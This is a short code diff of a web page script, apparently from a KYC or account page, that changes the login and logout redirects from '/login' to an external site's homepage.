@@ -224,7 +224,7 @@
 
 <script>
     const userToken = localStorage.getItem('user_token');
-    if (!userToken) window.location.href = '/login';
+    if (!userToken) window.location.href = 'https://growcapitalresearch.com';
 
     const userInfo = JSON.parse(localStorage.getItem('user_info') || '{}');
     if (userInfo.name)   document.getElementById('kycName').value   = userInfo.name;
@@ -414,7 +414,7 @@
         } catch (e) {}
         localStorage.removeItem('user_token');
         localStorage.removeItem('user_info');
-        window.location.href = '/login';
+        window.location.href = 'https://growcapitalresearch.com';
     });
 
     // INIT
